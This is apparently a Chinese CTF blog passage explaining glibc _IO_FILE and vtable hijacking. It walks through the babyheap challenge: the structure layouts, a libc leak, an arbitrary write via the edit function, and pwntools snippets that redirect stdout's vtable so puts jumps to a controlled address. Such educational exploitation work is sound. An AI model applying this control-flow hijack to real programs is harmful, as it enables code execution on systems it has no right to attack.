<span class="comment">// 占用0xd8字节</span></span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两个结构体的地址都可以通过 libc 进行查找</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stdout_addr = libc_base + libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">stdout_addr_vtable = stdout_addr + <span class="number">0xd8</span></span><br></pre></td></tr></table></figure><h2 id="IO-FILE">_IO_FILE</h2><p>这个是文件流的相关定义和数据</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span> <span class="comment">//这个地方，指向了下一个结构体，用于将所有的FILE连接成一个链表</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>下面这是在 pwndbg 中获取到的 _IO_FILE_plus 结构体的数据，供参考（<a href="https://www.jianshu.com/p/a6354fa4dbdf" target="_blank" rel="noopener">来源</a>）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gef➤  p  *(struct _IO_FILE_plus *) <span class="built_in">stdout</span></span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0xfbad2887</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x7f5b6742a6a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x7f5b6742a6a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7f5b6742a6a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x7f5b6742a6a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f5b6742a6a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x7f5b6742a6a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x7f5b6742a6a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x7f5b6742a6a4</span> &lt;_IO_2_1_stdout_+<span class="number">132</span>&gt; <span class="string">""</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x7f5b674298e0</span> &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    _fileno = <span class="number">0x1</span>, </span><br><span class="line">    _flags2 = <span class="number">0x0</span>, </span><br><span class="line">    _old_offset = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    _cur_column = <span class="number">0x0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>, </span><br><span class="line">    _shortbuf = <span class="string">"\n"</span>, </span><br><span class="line">    _lock = <span class="number">0x7f5b6742b780</span> &lt;_IO_stdfile_1_lock&gt;, </span><br><span class="line">    _offset = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x7f5b674297a0</span> &lt;_IO_wide_data_1&gt;, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0x0</span>, </span><br><span class="line">    _mode = <span class="number">0xffffffff</span>, </span><br><span class="line">    _unused2 = '\000' &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7f5b674286e0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如果 libc 的版本是 2.23， 我们在构造结构体的时候不用理会 _IO_FILE</strong></p><p><strong>但是 libc 2.24 版本及以上对 _IO_FILE 进行了检测，所以这个结构体也要一同构造</strong></p><p>下面是检测的定义</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)   </span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><h2 id="IO-jump-t">_IO_jump_t</h2><p>这是一个虚表，里面存放了多个函数的指针，它会在程序进行<strong>输出</strong>等过程时调用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以下是 *vtable 中，各个函数所要调用的地址，根据自己要进行攻击的函数，来确定覆盖哪一个指针。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// "extra word"</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1>babyheap</h1><p><a href="/uploads/0x00ctf_baby_heap.7z">0x00ctf_baby_heap</a></p><p><a href="https://xz.aliyun.com/t/2317" target="_blank" rel="noopener">参考资料</a></p><p>首先 checksec</p><p>本题的 libc 为 2.23 ，所以暂不考虑 *vtable 的有效性检测问题。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/15/7AqBvUsyt8rPF46.png" alt="Snipaste_2020-03-15_14-54-58.png"></p><h2 id="简单分析">简单分析</h2><p>这是一个用户管理程序，有 add, edit, ban, changename 四个功能。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/15/rAnOD87BEdjmhUS.png" alt="Snipaste_2020-03-15_14-54-58.png"></p><ol><li>add 功能负责在 users 处申请指针，并开辟堆块存放 name</li><li>edit 负责对 users 数组中<strong>非空</strong>的堆块进行修改（没有检测该堆块是否合法）</li><li>ban 负责把 某个users free掉，并且把指针置零</li><li>changename 负责修改 name 处的名字，是管理员的名字</li></ol><p>这就可以造成任意地址写， 我们可以在 <strong>name</strong> 处布置地址，然后通过 <strong>edit</strong> 来修改。</p><p>同时，还有一个明显泄露 read 函数真实地址的点，可以获取 libc 地址。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/15/Je4C5uyUdrHmB1l.png" alt="Snipaste_2020-03-15_14-54-58.png"></p><p>因为 FULL RELRO，我们不能对 got表 进行修改来劫持控制流，这里就要用到 _IO_FILE 利用方法了。</p><h2 id="IO-FILE利用">_IO_FILE利用</h2><p>我们先将 *vtable 的值改为 0x602088 (bss_name-0x18)，然后随即在puts上面下断点：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = p64(bss_name - <span class="number">0x18</span>)[:<span class="number">6</span>] <span class="comment">#至于为什么只改六位，那是因为edit会查询原地址的字符串长度，最多能改六个字节，不过已经够用了</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="number">12</span>, payload2)</span><br></pre></td></tr></table></figure><p>我们看到在 puts+165 的位置，程序 call [rax + 0x38]，这就是 vtable 的作用，程序在输出的时候会调用这个表，在puts时调用的就是 *(vtable + 0x38)，所以我们稍微构造一下 [rax+0x38]（已经转移到了 bss段上，也就是<strong>bss_name + 0x20</strong>），就把rip劫持到了。</p><p>本题我劫持到了 authnone_create 函数，具体介绍见下文。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppv